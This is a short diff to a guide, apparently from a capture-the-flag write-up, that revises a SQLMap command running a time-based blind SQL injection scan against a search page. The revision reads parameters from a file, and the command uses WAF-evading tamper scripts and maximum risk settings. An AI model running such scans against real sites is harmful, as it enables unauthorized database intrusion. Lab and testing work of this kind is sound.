@@ -26,7 +26,7 @@ command sequence incorporating everything:
 
 4. Run SQLMap with the generated wordlist and crawling enabled:
    ```bash
-   sqlmap -u "https://ctf.com/Search.aspx?postback=true&more=false&jto=1&q=consultant&rad=5&where=dusseldofr&indid=37&indid=4" --technique=T --batch --delay=25 --time-sec=15 --random-agent --tamper=between --tamper=space2comment --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --wordlist=params.txt --crawl=3
+   sqlmap -u "https://ctf.com/Search.aspx?postback=true&more=false&jto=1&q=consultant&rad=5&where=dusseldofr&indid=37&indid=4" --technique=T --batch --delay=25 --time-sec=15 --random-agent --tamper=between --tamper=space2comment --proxy=http://127.0.0.1:8080 --level=5 --risk=3 --crawl=3 -p $(cat params.txt | tr '\n' ',')
    ```
 
 This comprehensive approach combines the strengths of parameter discovery tools with the thoroughness of SQLMap's scanning capabilities.
